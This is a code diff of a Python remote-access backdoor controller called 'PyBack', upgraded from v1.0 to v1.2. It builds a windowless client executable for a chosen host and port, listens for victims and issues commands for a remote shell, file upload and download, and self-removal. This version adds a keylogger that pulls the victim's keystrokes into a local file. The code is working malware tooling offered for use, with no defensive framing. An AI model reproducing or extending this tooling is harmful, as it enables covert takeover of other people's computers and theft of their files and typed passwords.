@@ -10,7 +10,7 @@ import shutil
 
 ##############################################
 #                                            #
-#                   v1.0                     #
+#                   v1.2                     #
 #           Coded by Blueman678              #
 #   GitHub: https://github.com/Blueman678/   #
 #                                            #
@@ -43,24 +43,25 @@ class Server(): #class Server: define the server properties
 
 
 
+
 def main_menu(): #define the main menu
     while True:
         os.system(clear)
         print("""
-        1. Configure the client file
+        1. Create and configure a backdoor
         2. Listen to a port and remote a backdoor
         3. Exit
         """)
         choice = input("\n Enter your choice: ")
         if int(choice) == 1:
-            configure()
+            create()
         if int(choice) == 2:
             listener()
         elif int(choice) == 3:
             exit()
 
 
-def configure(): #configure the client with ip and port
+def create(): #configure the client with ip and port
     os.system(clear)
     HOST = input("Enter the host/ip of the client: ")
     PORT = input("Enter the port of the client: ")
@@ -74,7 +75,7 @@ def configure(): #configure the client with ip and port
     if exe == 'y':
         os.system(clear)
         print('Creating the executable... This may take a while.')
-        os.system("pyinstaller --clean -w -F --distpath exe --log-level WARN client.py")
+        os.system("pyinstaller -wF --clean --onefile --distpath exe --log-level WARN client.py")
         os.remove('client.spec')
         os.remove('client.py')
         shutil.rmtree('build')
@@ -102,8 +103,8 @@ def listener(): #define the socket and listen for connections
 
 
 def interpreter(sock, client): #wait for commands and interpret them
-    print("Enter a command or 'help', for a list of the availables commands")
     os.system(clear)
+    print("Enter a command or 'help', for a list of the availables commands")
     while True:
         command = input('>>> ')
         try:
@@ -113,7 +114,11 @@ def interpreter(sock, client): #wait for commands and interpret them
                 sock.close()
                 exit()
             else:
-                exec(f"{command}()")
+                command = command.split(" ")
+                if len(command) > 1:
+                    exec(f"{command[0]}('{command[1]}')")
+                else:
+                    exec(f"{command[0]}()")
         except NameError:
             print("Command not found! Enter 'help' to see the availables commands.")
 
@@ -122,14 +127,32 @@ def interpreter(sock, client): #wait for commands and interpret them
 def help(): #help command: show the availables commands
     print(
     """
-    Here are the differents availables commands:\n
+    Here are the differents availables commands:
+
+    \033[4mPyBack commands:\033[0m
+    - background: Put the client session in background.
+    - exit: Exit and kill the client session.
+    - remove: Remove all the files and kill the client session.
+
+    \033[4mExploit commands:\033[0m
+    - cmd: Open a shell on the client machine.
     - upload: Upload a file to the client.
     - download: Download a file from the client.
-    - cmd: Open a shell on the client machine.
-    - exit: Exit and close the socket and client session.
+    - keylogger [start/stop]: Start or stop a keylogger and get the file with the keylogs.
     \n
     """)
-    os.system('pause')
+
+
+
+def background():
+    server.send("background".encode())
+    main_menu()
+
+
+def remove():
+    server.send("remove".encode())
+    main_menu()
+
 
 
 def upload(): #upload command: upload a file to the client
@@ -159,6 +182,7 @@ def download(): #download command: download a file from the client
     print("File received succesful!")
 
 
+
 def cmd(): #cmd command: open a shell on the client machine
     os.system(clear)
     server.send('cmd'.encode())
@@ -172,6 +196,20 @@ def cmd(): #cmd command: open a shell on the client machine
         else:
             server.send('exit'.encode())
             break
+
+
+
+def keylogger(option): #keylogger command: save the keystrokes from the client
+    server.send(f'keylogger {option}'.encode())
+    if option == 'stop':
+        print('Killing keylogger...')
+        keylogs = server.recv().decode()
+        with open('keylogs.txt', 'a') as file:
+            file.write(keylogs)
+        print("Keylogger is killed! All the keylogs are in the file 'keylogs.txt'.")
+    elif option == 'start':
+        print("Keylogger is starting...")
+
 
 
 if os.name == 'nt':
